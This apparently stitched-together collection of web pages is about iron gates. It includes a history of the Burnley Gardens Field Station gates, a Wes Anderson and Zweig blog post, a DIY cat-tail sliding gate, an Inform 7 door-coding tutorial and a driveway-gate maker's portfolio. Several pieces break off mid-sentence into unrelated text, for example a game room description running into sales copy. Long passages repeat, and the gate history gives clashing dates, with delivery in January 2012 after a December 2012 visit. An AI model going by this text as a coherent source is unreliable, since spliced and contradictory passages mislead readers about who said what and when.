2012, and a visit to the Daylesford workshop was arranged to view the gates and posts in August. At this workshop site visit, the finial sequoia cones for the posts were thought to be too open in structure, and David was asked to re-do them.</p>   <h2><strong>Installing the new gates</strong></h2>   <p>As the original quote didn&#x2019;t include installation, but only manufacture and delivery, Ben Sibley was approached to install the posts and hang the gates upon completion. Ben had installed the Sugar Gum table setting outside the Herb Garden in late 2012, and his eye for detail and experience with installing large metal objects, (such as the cinema screen at the Abbotsford convent) made him an ideal choice for the gate and post installation. Ben and Andrew Smith travelled up to the <em>Overwrought</em> workshop in Daylesford in December 2012 to assess the suitability of the post and gate construction for installation before delivery to Burnley. Once Ben viewed the posts, he realised that burying them in concrete below ground level wouldn&#x2019;t enable the gates to be hung and levelled in perfect alignment. He requested that David alter the posts by removing 700 mm from the bottom of each, and replacing it with a metal baseplate for bolt fixing. Ben also asked David to construct reinforcement cages for the concrete footings, with threaded rods that the post baseplates would be bolted onto.</p>   <p>Ben&#x2019;s revised installation method would enable each post to be pivoted and raised or lowered in different directions on four individual bolts, to ensure that the gates would shut evenly in the middle.</p>   <p>The gates and posts were delivered in January 2012, but they had been slightly damaged prior to powdercoating (a dint in the bottom panel of one gate), which required a site visit by David after their installation. A delay in getting Ben Sibley registered as a University contractor, as well as his other work commitments, meant that the installation wasn&#x2019;t completed until June 2013. The sums of $3200 for the installation by Ben Sibley, plus approximately $2000 for uplighting for the posts, and $3700 for fencing works to incorporate the new gates into the existing fenceline, were all paid for by the Property and Campus Services Burnley budget.</p>   <p>After the gates were installed, other minor faults were noticed. Gaps were visible from the front and sides when the gates were shut and the cover strip between the gates wasn&#x2019;t in the right postion to hide them. This was due to the middle, upright metal sections warping during the weilding process. The pad bolt, used to secure one gate while the other could be opened separately, was glued up with paint and wouldn&#x2019;t slide. There also was no loop to lock the gates<strong>,</strong> and worse still, the finial sequoia cones still weren&#x2019;t right. David was very understanding, and as promised, made a site visit to repair the dent, re-weld the cover strip and take away the finials and pad bolt for re-doing.</p>   <p>With the gates installed, the garden beds on either side of the re-instated chain mesh fence were planted up. As the previous orchard pathway bed (prior to its removal for the construction of the new teaching facility in the early 1990s) had a green colour-theme, green flowering plants were chosen for the reinstated bed. The larger bed, on the Field Station side of the gates, was a new creation, as previously it had been the site for brick storage. A purple and orange colour theme was selected for this new bed, and three hooped strap metal balls of different sizes were installed as sculptural climber support elements.</p>   <p>Extensive rock edging work for each of the two new beds was installed either side of each post. These posts were aligned with the edges of the Orchard Gate Lawns on the western side of the gates and the roadway that leads down into the Field Station. The centre of the gates was aligned with the centre of the stone steps between the two lawns and the Significant sequoia behind them.</p>   <p>Tall &#x201c;jester hat&#x201d; style metal stands for growing hop vines onto were placed in the bed opposite, and due to the lowering of the fence height in front and to the right of the gates, a new open vista extended into the Field Station.</p>   <h2>&#xa0;<strong>A grand opening </strong></h2>   <p>With the gates installed, and planting in the adjoining beds completed, a date was organised for their official opening. As the gates were to be part of the 150th anniversary celebrations to commemorate the opening of the Gardens in 1863, it was decided to have the opening ceremony near the end of the year, rather than at the Open Day in late July. Andrew Smith approached the FOBG Committee and senior staff at the Campus, proposing that the gates be named in recognition of the outstanding contribution Michele Adler has made to Burnley since 1985, as a lecturer and also as a champion and advocate for the Gardens. This was agreed, and a temporary plaque naming the gates in honour of Michele was made, to be unveiled at the opening.</p>   <p>Invitations were widely sent out, and Carolyn Blackman was asked to officially open the gates. Stefan Arndt, as the Burnley Campus director, was asked to introduce and welcome invited guests.</p>   <p>The evening Opening ceremony was a memorable occasion, with the gates&#x2019; manufacturer David Dawson, past and present staff and students, and family and friends of Michele Adler attending.</p>   <p>Shortly after the ceremony took place, senior management at the University contacted the Campus to clarify the University policy on the naming of University assets. Unbeknown to Burnley staff, only the University Council and the Building and Estates Committee are able to agree on and recommend a naming proposal for an outdoor space, building, facility or road. As this approval had not been granted, some of the wording on the gate plaque needed to be changed. Accordingly, the words &#x201c;naming of the Gates&#x201d; were altered to read &#x201c;recognise the outstanding contribution of&#x201d; and the name of the gates was altered to &#x201c;Field Station Gates&#x201d;. Although the gates were not officially named after Michele, her contribution was nevertheless honoured in the alternative wording of the plaque installed in January 2014.</p>   <p>The installation of these splendid gates has deepened and renewed our appreciation of the history and significance of the Burnley Gardens. They have transformed a mundane feature into a beautiful ornament to the Gardens that will be a lasting testimonial to the vision and hard work of their designers and creators, and the generosity of the Friends of Burnley Gardens.</p>  </div>  
   <div>   <p>At , film-maker Wes Anderson discusses the influence of Stefan Zweig&#xa0;on his new movie&#xa0;&#xa0;with Zweig biographer&#xa0;George Prochnik (author of the forthcoming&#xa0;):</p>   <blockquote>    <p>There&#x2019;s a wonderful photochrom of the hotel that I always thought of as sort of the model for our hotel, which is the Hotel Pupp in Karlovy Vary, which was in Carlsbad. The thing we learned when we visited all sorts of places that we found on this collection of pictures was that none of them were enough like what they once were to work for us. But the photochrom images seemed to tap into a truth about Zweig&#x2019;s vision of the world that I was able to draw on in developing a visual aura for the film.</p>    <p>In The Post Office Girl, Zweig&#x2019;s description of the grand hotel in Switzerland is so evocative. The protagonist is a girl who works in the post office. She&#x2019;s invited to stay in this hotel as a gift from her rich aunt, and when she arrives in this place, the management thinks she&#x2019;s there to make a delivery. Her suitcase is a basket. Finally they realise she&#x2019;s actually going to be a guest in the hotel, which is unlike anywhere she&#x2019;s ever been. Her point of view about this treatment she receives, and her experience of walking in and realising, &#x201c;This is where I&#x2019;m going to sleep&#x201d;, is so powerful. But also that by the time her holiday abruptly ends, she is already addicted to this other way of life, and her existence is so dramatically changed, and a sort of desperation comes over her &#x2014; and then a connection she makes with someone who is in his own desperate state. The idea of that work being something that had been out of print for that long is sort of surreal.</p>   </blockquote>   <p>At a recent event at the New York Public Library, Anderson similarly discussed&#xa0;Zweig&#x2019;s work with&#xa0;Paul Holdengr&#xe4;ber:</p>   <p>&#xa0;</p>   <p>UK publisher Pushkin Press has recently published <em>&#xa0;</em>a selection of Zweig&#x2019;s writings that inspired Anderson. The cover illustration (pictured top) is by &#xa0;(whose covers for Alma Classics ). Pushkin have reissued a number of Zweig&#x2019;s books with covers by Burton, , and&#xa0;.</p>   <p>The movie itself was reviewed all over place the last week, but I quite enjoyed Richard Brody&#x2019;s review for :</p>   <blockquote>    <p>Perhaps more than ever, Anderson takes a joyful yet aching delight in recreating the styles of bygone days. The hotel is like a majestically confected cake on the outside and a jewel box on the inside, adorned with staff and guests whose uniforms and fashions are nuanced to the buttons, and whose behavior is self-controlled to the glance. Yet also, more than in any of his other films, that very recreation is his subject. &#x201c;The Grand Budapest Hotel&#x201d; is about the spiritual heritage and the political force of those long-vanished styles&#x2014;about the substance of style, not just the style of his Old World characters but also, crucially, Anderson&#x2019;s own. This isn&#x2019;t Anderson&#x2019;s most personal film, in the strict sense, but it is, alongside &#x201c;The Life Aquatic with Steve Zissou,&#x201d; his most reflexive one&#x2014;even more so because the new film exposes the inner workings not just of his practice of filmmaking but of his sensibility.</p>   </blockquote>   <p><strong>UPDATE:</strong>&#xa0; talks to the film&#x2019;s lead graphic designer Annie Atkins about her work:</p>   <blockquote>    <p>We actually used comparatively few typefaces in the movie, as most lettering was created by hand. Wes and Adam had been on location recces all around Eastern Europe and had references of all kinds of hand-made signage from the last 100 years or so. The beautiful thing about period filmmaking is that you&#x2019;re creating graphic design for a time before graphic designers existed, per s&#xe9;. It was really the craftsmen who were the designers: the blacksmith designed the lettering in the cast iron gates; the glazier sculpted the lettering in the stained glass; the sign-painter drew the lettering for the shopfronts; the printer chose the type blocks for the stationery&#x2026;</p>    <p>&#x2026;&#xa0;My absolute favourite piece is the book itself that opens the story. It&#x2019;s a modern pink hardback with a drawing of the hotel on the front, and the name of the movie as the hotel sign. It&#x2019;s a relatively simple piece, but it&#x2019;s really special having a prop that you made with the movie&#x2019;s name on it like that. I remember Wes had sent me a quick sketch showing his idea for the book, and I really loved being able to help make that work for him. I treasure that piece, actually &#x2013; we made three for the shoot, in case one got dropped in the snow, and so I brought one home with me.</p>   </blockquote>   <h3>Similar Posts:</h3>   <ul>    <li>, March 17, 2014</li>    <li>, April 9, 2014</li>    <li>, March 2, 2015</li>   </ul>   <footer>    <p> Categories: , | Tags: , , , | </p>   </footer>   </div>

   <div>   <p>The wrought <b>iron</b> <b>gates</b> that separate the Field station from the ornamental Gardens to the west are a lasting and spectacular gift to the University of Melbourne by the Friends of Burnley Gardens.</p>   <p>Opened in 2013 as part of the 150<sup>th</sup> anniversary of the official Gardens Opening, they are the latest in a series of <b>gates</b> of different styles that have stood more or less in this location since the 1860s. Originally a single-opening, slightly ornate timber affair, then later a plain and functional, double-opening, chain mesh construction, the new entrance <b>gates</b> are now a sculptural piece of garden art.</p>   <h2><strong>Stepping back in time</strong></h2>   <p>In 1860 the land then known as the Survey Paddock was granted to the Horticultural Society for the trialling of exotic plants for the newly established Colony, on condition that a portion of the land remain open and accessible to the public. It therefore became necessary that a separate area for the proving ground be established, from which the public could be excluded. This fenced portion, at the lower east end of the area (by then re-named Richmond Park), contained numerous edible and ornamental plants, and due to the predominance of fruit trees, became known as The Orchard. A change in land use in the late 1980s from fruit tree production to horticultural research saw the area re-named The Field Station by Senior Lecturer James Hitchmough (though some still refer fondly to it as The Orchard, in memory of its historical use).</p>   <p>Coinciding with this name change, a new teaching facility (Landscape Shed) was constructed along the north-western boundary of the fenced, newly named, Field Station. Landscaping works after the building&#x2019;s completion resulted in the double chain mesh entrance <b>gates</b> being moved from their original position in line with the western fence line, to a new, indented, alcove position, slightly downhill from their original location.</p>   <p>The original site of the <b>gates</b> is historically significant because of their location at the crossroad of two paths, which were part of the original, rather formal 1860 <b>design</b> by Alfred Lynch. These two straight axes, one the roadway that runs in an east-west direction to the bottom of the Field Station (the former orchard or proving ground) and the other the north-south pathway that runs along the fence of the Field Station, are all that remains of Lynch&#x2019;s <b>design</b>. (Charles Bogue Luffmann, some thirty years later, altered the rest of Lynch&#x2019;s <b>design</b> to what essentially exists today. Rather than straight paths or roadways, Luffmann redesigned them to be curved and naturalistic, constructed below the level of the surrounding lawns.)</p>   <p>A conservation Management Analysis undertaken in 2002 by Carmel McPhee, which investigated the heritage significance of the entire Burnley site, recommended that the <b>gates</b> be put back in their original position in line with the western fence line</p>   <p>At the time, the cost of relocation, and the landscaping involved, was felt to be of a lower priority for funding than other projects that the Gardens required. Fortunately, the Friends of Burnley Gardens (FOBG) were able to assist with funding. This came about, in part, because the entrance area to the former Orchard was a component of the historical garden tours undertaken by the FOBG and the need to reposition the <b>gates</b> became part of the tour story.</p>   <h2><strong>A new idea takes shape.</strong></h2>   <p>Michele Adler, a Burnley lecturer and instigator and author of Burnley Garden tours in the late 1980s, was one of only a few to understand and convey the history of the soon-to-be Heritage-listed Gardens. Michele&#x2019;s close involvement with the Friends of Burnley Gardens, as a Senior Executive Committee member, among other involvements, and her enthusiasm for creating a legacy for the 150<sup>th</sup> anniversary celebrations led her to suggest that the Friends donate ornamental <b>gates</b> to the Gardens. She felt that the relocation of the <b>gates</b> provided an ideal opportunity to replace the mundane chain mesh <b>gates</b> with beautiful ornamental <b>gates</b>. This idea was endorsed by the Committee of the FOBG, and planning began.</p>   <p>Given the history of the former Orchard, and the past use in the Gardens of the fruit-tree pruning technique known as <em>espalier</em>, Michele suggested that the <b>gates</b> be made to represent <em>espalier</em> fruit trees. Andrew Smith, the Gardens co-ordinator and University liaison officer for the FOBG, inspired by the <b>gates</b> of English parklands, suggested that the top of the <b>gates</b> curve and rise up to meet in the middle, rather than being square and flat on top.</p>   <p>In March 2011, with the initial concept worked out, several wrought <b>iron</b> gate manufacturers were approached to modify their gate designs to include pieces of fruit. It soon became apparent, however, that what was really needed was a metal worker-artist, rather than a company that could modify driveway <b>gates</b>. A suitable gate manufacturer was found by chance while an FOBG Significant Tree bus tour was passing through Daylesford in April 2011. With most of the FOBG Committee on board, the bus passed the display shop of the <em>Overwrought </em>metal work and <b>design</b> business, and the intricate and original gate designs on show were immediately appealing as being suitable. The bus driver was asked to turn around, and the contact details of David Dawson were taken for later follow up. David was subsequently contacted in June 2011, and asked to travel down to Melbourne to meet with committee members of the FOBG and University staff in August 2011 to discuss the project.</p>   <h2><strong>The final <b>design</b></strong></h2>   <p>The <b>design</b> ideas that came out of that initial meeting expanded on the original concept. David was able to accommodate and suggest ideas and solutions to all the creative input of those who attended the meeting. Michele made a sketch of these ideas and David was asked to quote on what was drawn and discussed. As the gate and post designs were unusual, with a high level of creative input needed, the committee agreed that no other companies would be asked to quote. David submitted the price of $10,450 plus GST in November 2011, and the Committee accepted the quote and asked him to proceed. The <b>design</b> sketch and notes from the August meeting were to be later expanded, but essentially were the same as what was finally installed.</p>   <p>The <b>design</b> consisted of two <b>gates</b>, the centre of which, when closed, would represent the trunk of a fruit tree, with each gate having horizontal &#x201c;branches&#x201d; bearing fruit that had been grown in the former Orchard. Grapes, apples, peaches and lemons were decided upon as the best representatives of the products of the old Orchard. Glenys Rose, an FOBG Committee member, suggested that the major bird species that frequent the gardens (magpie, rosella and cockatoo) could be shown perched on the espaliered branches.</p>   <p>As the <b>gates</b> were to be viewed from both sides, and to give a more realistic impression, the fruits and birds were designed to be three dimensional in form. David Dawson proposed that, rather than stone, the posts be made of metal, with laser cut-outs of fruit shapes on either side. Andrew put forward the idea of installing up-lights in each post, to enable the laser cut fruit shapes to be highlighted at night. Michele suggested that finials should be placed on top of each gate post, in keeping with Victorian-era gate designs. After discussion of using a fruit such as a pineapple as the finial, Michele suggested a sequoia cone be used. This had great merit, as one of the Significant trees, and some would suggest the signature tree of the Gardens, is the nearby <em>Sequoia sempervirens. </em> This tree, planted in 1861-2, is in direct line with the <b>gates</b> when viewed from the east side<em>.</em></p>   <p>Additional <b>design</b> details of the grape, apple, peach and lemon leaf and fruit sizes were given to David in February 2012. Progress pictures were sent to the committee in July 2012, and a visit to the Daylesford workshop was arranged to view the <b>gates</b> and posts in August. At this workshop site visit, the finial sequoia cones for the posts were thought to be too open in structure, and David was asked to re-do them.</p>   <h2><strong>Installing the new <b>gates</b></strong></h2>   <p>As the original quote didn&#x2019;t include installation, but only manufacture and delivery, Ben Sibley was approached to install the posts and hang the <b>gates</b> upon completion. Ben had installed the Sugar Gum table setting outside the Herb Garden in late 2012, and his eye for detail and experience with installing large metal objects, (such as the cinema screen at the Abbotsford convent) made him an ideal choice for the gate and post installation. Ben and Andrew Smith travelled up to the <em>Overwrought</em> workshop in Daylesford in December 2012 to assess the suitability of the post and gate construction for installation before delivery to Burnley. Once Ben viewed the posts, he realised that burying them in concrete below ground level wouldn&#x2019;t enable the <b>gates</b> to be hung and levelled in perfect alignment. He requested that David alter the posts by removing 700 mm from the bottom of each, and replacing it with a metal baseplate for bolt fixing. Ben also asked David to construct reinforcement cages for the concrete footings, with threaded rods that the post baseplates would be bolted onto.</p>   <p>Ben&#x2019;s revised installation method would enable each post to be pivoted and raised or lowered in different directions on four individual bolts, to ensure that the <b>gates</b> would shut evenly in the middle.</p>   <p>The <b>gates</b> and posts were delivered in January 2012, but they had been slightly damaged prior to powdercoating (a dint in the bottom panel of one gate), which required a site visit by David after their installation. A delay in getting Ben Sibley registered as a University contractor, as well as his other work commitments, meant that the installation wasn&#x2019;t completed until June 2013. The sums of $3200 for the installation by Ben Sibley, plus approximately $2000 for uplighting for the posts, and $3700 for fencing works to incorporate the new <b>gates</b> into the existing fenceline, were all paid for by the Property and Campus Services Burnley budget.</p>   <p>After the <b>gates</b> were installed, other minor faults were noticed. Gaps were visible from the front and sides when the <b>gates</b> were shut and the cover strip between the <b>gates</b> wasn&#x2019;t in the right postion to hide them. This was due to the middle, upright metal sections warping during the weilding process. The pad bolt, used to secure one gate while the other could be opened separately, was glued up with paint and wouldn&#x2019;t slide. There also was no loop to lock the <b>gates</b><strong>,</strong> and worse still, the finial sequoia cones still weren&#x2019;t right. David was very understanding, and as promised, made a site visit to repair the dent, re-weld the cover strip and take away the finials and pad bolt for re-doing.</p>   <p>With the <b>gates</b> installed, the garden beds on either side of the re-instated chain mesh fence were planted up. As the previous orchard pathway bed (prior to its removal for the construction of the new teaching facility in the early 1990s) had a green colour-theme, green flowering plants were chosen for the reinstated bed. The larger bed, on the Field Station side of the <b>gates</b>, was a new creation, as previously it had been the site for brick storage. A purple and orange colour theme was selected for this new bed, and three hooped strap metal balls of different sizes were installed as sculptural climber support elements.</p>   <p>Extensive rock edging work for each of the two new beds was installed either side of each post. These posts were aligned with the edges of the Orchard Gate Lawns on the western side of the <b>gates</b> and the roadway that leads down into the Field Station. The centre of the <b>gates</b> was aligned with the centre of the stone steps between the two lawns and the Significant sequoia behind them.</p>   <p>Tall &#x201c;jester hat&#x201d; style metal stands for growing hop vines onto were placed in the bed opposite, and due to the lowering of the fence height in front and to the right of the <b>gates</b>, a new open vista extended into the Field Station.</p>   <h2>&#xa0;<strong>A grand opening </strong></h2>   <p>With the <b>gates</b> installed, and planting in the adjoining beds completed, a date was organised for their official opening. As the <b>gates</b> were to be part of the 150th anniversary celebrations to commemorate the opening of the Gardens in 1863, it was decided to have the opening ceremony near the end of the year, rather than at the Open Day in late July. Andrew Smith approached the FOBG Committee and senior staff at the Campus, proposing that the <b>gates</b> be named in recognition of the outstanding contribution Michele Adler has made to Burnley since 1985, as a lecturer and also as a champion and advocate for the Gardens. This was agreed, and a temporary plaque naming the <b>gates</b> in honour of Michele was made, to be unveiled at the opening.</p>   <p>Invitations were widely sent out, and Carolyn Blackman was asked to officially open the <b>gates</b>. Stefan Arndt, as the Burnley Campus director, was asked to introduce and welcome invited guests.</p>   <p>The evening Opening ceremony was a memorable occasion, with the <b>gates</b>&#x2019; manufacturer David Dawson, past and present staff and students, and family and friends of Michele Adler attending.</p>   <p>Shortly after the ceremony took place, senior management at the University contacted the Campus to clarify the University policy on the naming of University assets. Unbeknown to Burnley staff, only the University Council and the Building and Estates Committee are able to agree on and recommend a naming proposal for an outdoor space, building, facility or road. As this approval had not been granted, some of the wording on the gate plaque needed to be changed. Accordingly, the words &#x201c;naming of the <b>Gates</b>&#x201d; were altered to read &#x201c;recognise the outstanding contribution of&#x201d; and the name of the <b>gates</b> was altered to &#x201c;Field Station <b>Gates</b>&#x201d;. Although the <b>gates</b> were not officially named after Michele, her contribution was nevertheless honoured in the alternative wording of the plaque installed in January 2014.</p>   <p>The installation of these splendid <b>gates</b> has deepened and renewed our appreciation of the history and significance of the Burnley Gardens. They have transformed a mundane feature into a beautiful ornament to the Gardens that will be a lasting testimonial to the vision and hard work of their designers and creators, and the generosity of the Friends of Burnley Gardens.</p>  </div>

   <div>   <p>The front gate is rolling on its track. I am extremely happy with it as it looks just as I had envisioned it. Although there are more than 300 weld points, the whole gate has the minimalist feel that I wanted. A few people have seen it so far and easily identified the <b>design</b> as cat tails.</p>   <p>This was a fun project even if the welding, grinding, sanding, and painting was quite tedious. I spent a lot of time stepping back, looking at the progress and planning my next move. Actually, I had to plan three or four moves in advance, as in a game of chess, so that I didn&#x2019;t end up with overlaps, gaps, or clutter that didn&#x2019;t make sense in the <b>design</b>.</p>   <p>Although I was replicating a wild grass, I wanted order to the <b>design</b>, so I worked from the center out to both sides, fabricating two of every stalk. The left and right sides from center are mirror images.</p>   <p>Assembly: The frame of the gate is made of 2&#x2033; x 2&#x2033; x 1/16&#x2033; square tubing. The two square tubes at the bottom formed a beam once the stalks were all welded in place; the gate doesn&#x2019;t sag at all. I drilled 1/2&#x2033; holes in the beam for the stalks to pass through.&#xa0; The stalks of the plants are 1/2&#x2033; round stock. The seed pods at the ends of the stalks are made from black pipe; half-inch pipe fit well over the round stock but wasn&#x2019;t fat enough for a seed pod, so I cut lengths of 3/4&#x2033; pipe, too. I pounded the smaller pipe into the larger pipe then welded the pipe assembly to the stalks. After I cleaned up all the weld points with the grinder, I applied body filler (Bondo) to most of the joints and the tops and bottoms of the seed pods. Then I sanded the body filler smooth. I topped everything off with two coats of red oxide primer followed by one coat of dark gray. This color may or may not change in the future; we&#x2019;ll have to see what color the containers end up being painted.</p>   <p>Armando and I were working on the job, and I rounded up two other local workers to help us move the gate from container 3 to its place on the angle <b>iron</b> track. Although the <b>design</b> is very &#x201c;airy,&#x201d; this is one heavy gate. I think a gate opener is in order; I can slide the gate but Cynthia pushed on it as hard as she could but it was as if it was welded to the ground.</p>   <p>Here are some photos. Remember, click a photo to make it larger, click the back button to return.</p>   <div>    <p>Fabrication underway.</p>   </div>   <div>    <p>Here is the gate all welded and welds ground out, ready for body filler. I think the <b>design</b> is graceful and has a hint of art nouveau.</p>   </div>   <div>    <p>Looking out, you don&#x2019;t feel like you are in a garrison. There is a hint of a family crest in the center of the gate.</p>   </div>   <div>    <p>Dog tired but happy. The curved stalks are strategically placed so as to strengthen the vertical stalks.</p>   </div>   <div>    <p>I welded this bracket from metal 2x4s. The wheels guide the gate as it opens and closes. Remember, there will be a concrete hat on top of the columns.</p>   </div>   <p>Next, I think I will take some pictures of a small model that I built showing the new and improved one-story <b>design</b> of the house. I&#x2019;ll post them so you can see the new plan.</p>   <p>That&#x2019;s all for now.</p>   <h6>This post is the property of the owner of this blog. All rights reserved. Ask first.

   <div>   <p>We had a great time this morning at the <b>Iron</b> Gate Chrome &amp; Coffee meetup. it was the first time at this facility and it was very impressive.

Also as you can see, the old gate wasn&#x2019;t square with the house and very structurally fatigued from its high ratio width.

After many years of sun damage and rot, it was well past due to replace our gate. Joel worked tirelessly on the custom design and sourced the materials quickly. Initially, we only had a rough idea of an <b>iron</b> gate, but Joel&#x2019;s artistic touch for rounding out the details came out beautifully in the final product. We couldn&#x2019;t be happier with our new gate and it certainly improved the overall look of our home.</p>        <strong>Maryann Santos</strong>       </div>       </div>      </div>     </div>    </div>   </div>

   <article>   <p><span><strong><span>Doors </span></strong><span>Doors can be integral elements of IF and dealing with locked doors are standard puzzles. Creating doors in IF takes some extra work, thinking, and coding since they behave differently than other objects in Inform 7. Doors are unique in that they have two sides and connect two rooms. For now, think of a door in IF as another room that connects two other rooms.</span></span></p>   <p><span>Doors can also have the following properties:</span></p>   <p><span>they can be <b>open </b>(it is open to start),</span> <span> they can be <b>closed </b>(it is closed to start &#x2013; this is the default), </span> <span> they can be <b>locked </b>(it is locked to start), </span> <span> and they can be <b>lockable </b>(it is unlocked to start but can be locked).</span></p>   <p><span>Here is how we code a door in IF:</span></p>   <div>    <span>The <b>iron</b> gate is a <b>door</b>. <b>It is east of the Sidewalk and west of the Front Porch.</b></span>   </div>   <div>    <span>. </span>   </div>   <div>    <span>A door is created by establishing its relationship between two existing rooms which by default also establishes its location.</span>   </div>   <div>    <span>&#xa0;</span>   </div>   <div>    <div>     <span>Let&#x2019;s create the two adjacent rooms to complete the map:</span>    </div>    <div>     <span>The <b>iron</b> gate is a door.

The rooms do not have the pathways included because the door object contains the pathway information.</span>    </div>    <div>     <span>2.

This is usually undesirable since the mention of the door provides no information as to which direction the door leads to. The solution to this is make the door scenery (so it will not be mentioned separately) and to mention the door in both of the room descriptions (so the player knows it is there.)</span>     </div>     <div>      <span>The <b>iron</b> gate is a door. <b>It is scenery. </b>It is east of the Sidewalk and west of the Front Porch.</span>     </div>     <div>      <span>The Sidewalk is a room. &#x201c;This is the sidewalk in front of the house you grew up in.

We build them all by hand, no two are quite the same. We work with individuals and/or their contractors to provide a gate that will be the perfect fit into their driveway entrance. Our <b>gates</b> will work with most gate openers</p>   <h2>Minnesota Oak Tree Driveway Gate</h2>   <p>This beautiful <strong>oak tree driveway gate</strong> is flanked by two massive stone columns and safeguards a log home located on an exceptional walleye fishing lake north of <strong>Minneapolis,</strong> <strong>Minnesota.</strong> We custom built the <b>gates</b> in <strong>Columbus, Ohio</strong> to fit the existing stone columns. All measurements were coordinated ahead of time and the communication worked out quite well because the <b>gates</b> fit their new resting spot perfectly. The overall height of these oak tree themed <b>gates</b> is about 10&#x2032; after we hung them.</p>   <h2>Texas Driveway <b>Gates</b></h2>   <h3>Featuring Tree &amp; Horse Theme</h3>   <p>These feature a two-tone powder coated finish. We also added horses and a silhouette of our client&#x2019;s dog to create a plasma cut scene.</p>   <h2>Charleston, SC Driveway <b>Gates</b></h2>   <p>This dual swing <b>iron</b> gate is mounted to steel posts and brick columns with automated electric gate openers attached. Located in front of a beautiful <strong>Charleston, SC</strong> residence.</p>   <h2>Missouri Driveway Gate featuring Horse &amp; Tree Design</h2>   <p>We designed, built and delivered this 16&#x2032; single swing gate to <strong>Missouri</strong>. The tree is plasma cut from 3/16&#x2033; steel sheet and bolted to the square tubing frame of the gate. The two horse silhouettes were also plasma cut and then welded onto the pickets of the gate. Everything was powder coated black in our new powder coat oven.</p>   <h2>Indiana Oak Tree Driveway <b>Gates</b></h2>   <p>Below is a set of <strong>custom cut <b>gates</b></strong> leaning against the side of my shop after the paint cured, shortly before being loaded up and hauled to Indiana where it was installed along with another set just like it.

   <div>     <p>We finally leave near Belgrade around 11 am. The weather is better than we expected but still only 15&#xb0;C and somewhat overcast.

In the end we opt for in Romania, not because it&#x2019;s on the Danube, but because it&#x2019;s midway to Gyor in Hungary&#xa0; which might possibly offer cycling possibilities if the weather improves just a little bit.</p>    </div>

   <div>   <div>    <div>     <div>      <div>       <h1>Wrought Iron Gate Project</h1>      </div>       <div>       <div>        <span>I replaced this old rotten gate back in August of 2014.&#xa0; My client wanted it changed from wood to wrought iron with modest decorative iron, and high enough to keep the deer out.&#xa0; This is the beginning of what will be incorporated into a several hundred foot wrought iron fence dividing their property from the neighbors that I&#x2019;ll be building in the future, thus replacing theturquoise fence with matching wrought iron.&#xa0; Instead of screwing the gate together as is more conventional, I set posts through the slab and welded everything together for the ultimate rigidity and longevity.</span>       </div>       <div>        <span>&#xa0;</span>       </div>       <div>        <span>Challenges included anchoring/drilling through concrete slab to set posts as well as the severe incline to the landscaping adjacent to the left side of the gate. Also as you can see, the old gate wasn&#x2019;t square with the house and very structurally fatigued from its high ratio width. Below you can see how it started:</span>       </div>      </div>       <div>       <h2>Old Gate (Before)</h2>      </div>       <div>       <div>        <div>         <h3> Old wooden gate </h3>         <p> Dilapidated Old Gate </p>        </div>        <div>         <h3> Bent Hinges </h3>         <p> Hinges were bent on old gate, making it hard to open </p>        </div>        <div>         <h3> Wood Rot </h3>         <p> The old wood gate had started to rot </p>        </div>        <div>         <h3> Old Post Removal </h3>         <p> This post that was sunk into the concrete had to be removed prior to installing the iron replacement post </p>        </div>       </div>       </div>       <div>       <h2>New Gate (After)</h2>      </div>       <div>       <div>        <div>         <p> Gate when completed </p>        </div>        <div>         <h3> Latch System </h3>         <p> Custom fabricated latch system </p>        </div>        <div>         <h3> Gate Open </h3>         <p> Gate hinge system was designed to homeowner&#x2019;s request to swing outwards </p>        </div>        <div>         <h3> Latch </h3>         <p> Close-up of latch system </p>        </div>       </div>       </div>       <div>       <div>        <p><strong>Homeowner Testimonial </strong></p>        <p>We&#x2019;ve lived in our current home for almost twenty years, and the gate that we had attached to our side yard was another ten years old on top of that! After many years of sun damage and rot, it was well past due to replace our gate. Joel worked tirelessly on the custom design and sourced the materials quickly. Initially, we only had a rough idea of an iron gate, but Joel&#x2019;s artistic touch for rounding out the details came out beautifully in the final product. We couldn&#x2019;t be happier with our new gate and it certainly improved the overall look of our home.</p>        <strong>Maryann Santos</strong>       </div>       </div>      </div>     </div>    </div>   </div>

   <article>   <div>    <h1>Bob Dylan Uses Scrap Metal To Make Big Iron Gates In His Free Time (5 pics)</h1>    <p>by &#xb7; </p>   </div>  </article>  
   <div>   <p>The front gate is rolling on its track. I am extremely happy with it as it looks just as I had envisioned it. Although there are more than 300 weld points, the whole gate has the minimalist feel that I wanted. A few people have seen it so far and easily identified the design as cat tails.</p>   <p>This was a fun project even if the welding, grinding, sanding, and painting was quite tedious. I spent a lot of time stepping back, looking at the progress and planning my next move. Actually, I had to plan three or four moves in advance, as in a game of chess, so that I didn&#x2019;t end up with overlaps, gaps, or clutter that didn&#x2019;t make sense in the design.</p>   <p>Although I was replicating a wild grass, I wanted order to the design, so I worked from the center out to both sides, fabricating two of every stalk. The left and right sides from center are mirror images.</p>   <p>Assembly: The frame of the gate is made of 2&#x2033; x 2&#x2033; x 1/16&#x2033; square tubing. The two square tubes at the bottom formed a beam once the stalks were all welded in place; the gate doesn&#x2019;t sag at all. I drilled 1/2&#x2033; holes in the beam for the stalks to pass through.&#xa0; The stalks of the plants are 1/2&#x2033; round stock. The seed pods at the ends of the stalks are made from black pipe; half-inch pipe fit well over the round stock but wasn&#x2019;t fat enough for a seed pod, so I cut lengths of 3/4&#x2033; pipe, too. I pounded the smaller pipe into the larger pipe then welded the pipe assembly to the stalks. After I cleaned up all the weld points with the grinder, I applied body filler (Bondo) to most of the joints and the tops and bottoms of the seed pods. Then I sanded the body filler smooth. I topped everything off with two coats of red oxide primer followed by one coat of dark gray. This color may or may not change in the future; we&#x2019;ll have to see what color the containers end up being painted.</p>   <p>Armando and I were working on the job, and I rounded up two other local workers to help us move the gate from container 3 to its place on the angle iron track. Although the design is very &#x201c;airy,&#x201d; this is one heavy gate. I think a gate opener is in order; I can slide the gate but Cynthia pushed on it as hard as she could but it was as if it was welded to the ground.</p>   <p>Here are some photos. Remember, click a photo to make it larger, click the back button to return.</p>   <div>    <p>Fabrication underway.</p>   </div>   <div>    <p>Here is the gate all welded and welds ground out, ready for body filler. I think the design is graceful and has a hint of art nouveau.</p>   </div>   <div>    <p>Looking out, you don&#x2019;t feel like you are in a garrison. There is a hint of a family crest in the center of the gate.</p>   </div>   <div>    <p>Dog tired but happy. The curved stalks are strategically placed so as to strengthen the vertical stalks.</p>   </div>   <div>    <p>I welded this bracket from metal 2x4s. The wheels guide the gate as it opens and closes. Remember, there will be a concrete hat on top of the columns.</p>   </div>   <p>Next, I think I will take some pictures of a small model that I built showing the new and improved one-story design of the house. I&#x2019;ll post them so you can see the new plan.</p>   